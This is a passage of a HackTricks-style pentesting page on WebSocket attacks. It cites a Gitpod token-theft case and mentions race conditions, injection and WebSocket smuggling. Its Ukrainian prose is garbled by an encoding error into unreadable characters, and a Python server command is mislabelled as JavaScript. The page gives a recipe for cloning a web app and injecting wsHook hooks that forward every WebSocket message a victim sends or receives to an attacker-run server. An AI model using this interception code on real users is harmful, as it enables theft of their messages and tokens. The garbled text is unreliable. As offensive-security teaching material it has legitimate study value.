–£ —Ü—å–æ–º—É –±–ª–æ–∑—ñ [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º—ñ–≥ **–≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π JavaScript –≤ –ø—ñ–¥–¥–æ–º–µ–Ω—ñ** –¥–æ–º–µ–Ω—É, –¥–µ –≤—ñ–¥–±—É–≤–∞–ª–∞—Å—è –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—è —á–µ—Ä–µ–∑ –≤–µ–±-—Å–æ–∫–µ—Ç. –û—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –±—É–≤ **–ø—ñ–¥–¥–æ–º–µ–Ω**, **–∫—É–∫–∏** –Ω–∞–¥—Å–∏–ª–∞–ª–∏—Å—è, —ñ —á–µ—Ä–µ–∑ —Ç–µ, —â–æ **Websocket –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è–≤ –ü–æ—Ö–æ–¥–∂–µ–Ω–Ω—è –Ω–∞–ª–µ–∂–Ω–∏–º —á–∏–Ω–æ–º**, –±—É–ª–æ –º–æ–∂–ª–∏–≤–æ –∑ –Ω–∏–º —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è —Ç–∞ **–≤–∏–∫—Ä–∞—Å—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –∑ –Ω—å–æ–≥–æ**.

### –í–∏–∫—Ä–∞–¥–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö –≤—ñ–¥ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞

–°–∫–æ–ø—ñ—é–π—Ç–µ –≤–µ–±-–∑–∞—Å—Ç–æ—Å—É–Ω–æ–∫, —è–∫–∏–π –≤–∏ —Ö–æ—á–µ—Ç–µ –ø—ñ–¥—Ä–æ–±–∏—Ç–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Ñ–∞–π–ª–∏ .html) —Ç–∞ –≤ —Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–∫—Ä–∏–ø—Ç—É, –¥–µ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—è —á–µ—Ä–µ–∑ –≤–µ–±-—Å–æ–∫–µ—Ç, –¥–æ–¥–∞–π—Ç–µ —Ü–µ–π –∫–æ–¥:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
–ó–∞—Ä–∞–∑ –∑–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ —Ñ–∞–π–ª `wsHook.js` –∑ [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) —Ç–∞ **–∑–±–µ—Ä–µ–∂—ñ—Ç—å –π–æ–≥–æ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–∞–ø–∫–∏ –∑ –≤–µ–±-—Ñ–∞–π–ª–∞–º–∏**.\
–í–∏–∫—Ä–∏–≤–∞—é—á–∏ –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫ —Ç–∞ –∑–º—É—à—É—é—á–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø—ñ–¥–∫–ª—é—á–∞—Ç–∏—Å—è –¥–æ –Ω—å–æ–≥–æ, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –≤–∫—Ä–∞—Å—Ç–∏ –Ω–∞–¥—ñ—Å–ª–∞–Ω—ñ —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è —á–µ—Ä–µ–∑ –≤–µ–±-—Å–æ–∫–µ—Ç:
```javascript
sudo python3 -m http.server 80
```
## –ì–æ–Ω–∫–∏ —É–º–æ–≤

–ì–æ–Ω–∫–∏ —É–º–æ–≤ —É WebSockets —Ç–∞–∫–æ–∂ —î —Ä–µ–∞–ª—å–Ω—ñ—Å—Ç—é, [–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ](race-condition.md#rc-in-websockets).

## –Ü–Ω—à—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ

–û—Å–∫—ñ–ª—å–∫–∏ WebSockets —î –º–µ—Ö–∞–Ω—ñ–∑–º–æ–º –¥–ª—è **–Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö –Ω–∞ —Å–µ—Ä–≤–µ—Ä–Ω—É —Ç–∞ –∫–ª—ñ—î–Ω—Ç—Å—å–∫—É —Å—Ç–æ—Ä–æ–Ω—É**, –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, —è–∫ —Å–µ—Ä–≤–µ—Ä —Ç–∞ –∫–ª—ñ—î–Ω—Ç –æ–±—Ä–æ–±–ª—è—é—Ç—å —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, **WebSockets –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –∫—ñ–ª—å–∫–æ—Ö —ñ–Ω—à–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π, —Ç–∞–∫–∏—Ö —è–∫ XSS, SQLi –∞–±–æ –±—É–¥—å-—è–∫–∞ —ñ–Ω—à–∞ –∑–∞–≥–∞–ª—å–Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–µ–±-–¥–æ–¥–∞—Ç–∫—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —á–µ—Ä–µ–∑ WebSocket.**

## **WebSocket Smuggling**

–¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –≤–∞–º **–æ–±—ñ–π—Ç–∏ –æ–±–º–µ–∂–µ–Ω–Ω—è –æ–±–µ—Ä—Ç–æ–≤–∏—Ö –ø—Ä–æ–∫—Å—ñ-—Å–µ—Ä–≤–µ—Ä—ñ–≤**, –∑–º—É—à—É—é—á–∏ —ó—Ö –≤–≤–∞–∂–∞—Ç–∏, —â–æ **–≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –∑–≤'—è–∑–æ–∫ WebSocket** (–Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —Ü–µ –Ω–µ —Ç–∞–∫). –¶–µ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –ø—Ä–∏—Ö–æ–≤–∞–Ω–∏—Ö –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫**. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É:

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—Ç–∞** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.**

</details>
